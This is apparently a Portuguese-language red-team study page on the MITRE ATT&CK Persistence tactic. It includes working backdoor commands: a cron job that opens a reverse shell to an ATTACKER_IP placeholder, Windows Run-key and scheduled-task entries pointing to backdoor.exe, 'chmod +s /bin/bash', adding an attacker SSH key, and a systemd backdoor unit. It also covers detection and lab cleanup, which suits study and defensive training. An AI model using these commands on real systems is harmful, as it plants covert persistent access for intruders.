# 05 - Persistência

**MITRE ATT&CK Tactic:** [TA0003 - Persistence](https://attack.mitre.org/tactics/TA0003/)

## 📖 Sobre

Técnicas para **manter acesso** ao sistema mesmo após reboots, mudanças de credenciais ou outras interrupções. Garantir que o acesso não seja perdido.

## 🎯 Objetivo

Estabelecer mecanismos que permitam retornar ao sistema comprometido sem precisar re-explorar.

## 📚 Técnicas Principais

### T1053 - Scheduled Task/Job
- Cron jobs (Linux)
- Task Scheduler (Windows)
- Systemd timers
- At jobs

### T1547 - Boot or Logon Autostart Execution
- **T1547.001** - Registry Run Keys (Windows)
- **T1547.004** - Winlogon Helper DLL
- **T1547.006** - Kernel Modules and Extensions
- **T1547.009** - Shortcut Modification
- Startup folders

### T1136 - Create Account
- **T1136.001** - Local Account
- **T1136.002** - Domain Account
- Backdoor accounts

### T1098 - Account Manipulation
- **T1098.001** - Additional Cloud Credentials
- **T1098.004** - SSH Authorized Keys
- Modificar permissões de contas

### T1543 - Create or Modify System Process
- **T1543.003** - Windows Service
- **T1543.002** - Systemd Service
- **T1543.004** - Launch Daemon (macOS)

### T1505 - Server Software Component
- **T1505.003** - Web Shell
- **T1505.002** - Transport Agent (Exchange)
- Backdoors em aplicações web

### T1574 - Hijack Execution Flow
- **T1574.001** - DLL Search Order Hijacking
- **T1574.002** - DLL Side-Loading
- **T1574.006** - Dynamic Linker Hijacking (LD_PRELOAD)

## 🛠️ Técnicas por Sistema

### Windows
```
- Registry Run Keys
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  
- Scheduled Tasks
  schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon
  
- Windows Services
  sc create "MyService" binPath= "C:\backdoor.exe"
  
- WMI Event Subscriptions
  
- Startup Folder
  C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

### Linux
```
- Cron Jobs
  @reboot /path/to/backdoor.sh
  */5 * * * * /path/to/backdoor.sh
  
- Systemd Services
  /etc/systemd/system/myservice.service
  
- SSH Keys
  ~/.ssh/authorized_keys
  
- Bashrc/Profile
  ~/.bashrc
  /etc/profile
  
- SUID Binaries
  chmod +s /bin/bash
```

### Web
```
- Webshells persistentes
- Backdoor em código da aplicação
- Database triggers
- Modified .htaccess
```

## 🎓 Labs Práticos

- [ ] Criar scheduled task no Windows
- [ ] Adicionar cron job no Linux
- [ ] Criar backdoor account
- [ ] Adicionar SSH key
- [ ] Modificar registry run keys
- [ ] Criar serviço Windows malicioso
- [ ] Implementar webshell persistente

## 🛠️ Ferramentas

- **PowerShell** - Manipulação de registry, tasks
- **Crontab** - Cron jobs
- **Meterpreter** - Persistence modules
- **Empire** - Módulos de persistência
- **Impacket** - WMI, scheduled tasks

## 📝 Exemplos

### Cron Job Persistence (Linux)
```bash
# Adicionar ao crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/.backdoor.sh") | crontab -

# Criar script backdoor
echo '#!/bin/bash' > /tmp/.backdoor.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /tmp/.backdoor.sh
chmod +x /tmp/.backdoor.sh
```

### Registry Run Key (Windows)
```powershell
# Adicionar ao registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\backdoor.exe"
```

### SSH Authorized Keys
```bash
# Adicionar chave pública
echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Systemd Service (Linux)
```ini
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

## 🔍 Detecção

### Indicadores de Comprometimento
- Novas scheduled tasks/cron jobs
- Modificações em registry run keys
- Novas contas de usuário
- Serviços desconhecidos
- SSH keys não autorizadas
- Modificações em scripts de startup

### Monitoramento
- Auditoria de scheduled tasks
- Registry monitoring (Sysmon)
- File integrity monitoring (AIDE, Tripwire)
- Account creation logs
- Service installation events

## ⚠️ Limpeza

Sempre remover mecanismos de persistência após labs:
```bash
# Remover cron jobs
crontab -r

# Remover scheduled tasks (Windows)
schtasks /delete /tn "TaskName"

# Remover contas backdoor
userdel backdooruser
```

## 📚 Recursos

- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [Windows Persistence Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
- [Linux Persistence Techniques](https://attack.mitre.org/matrices/enterprise/linux/)

---

**Anterior:** [04-Execucao](../04-Execucao/) | **Próximo:** [06-ElevacaoPrivilegios](../06-ElevacaoPrivilegios/)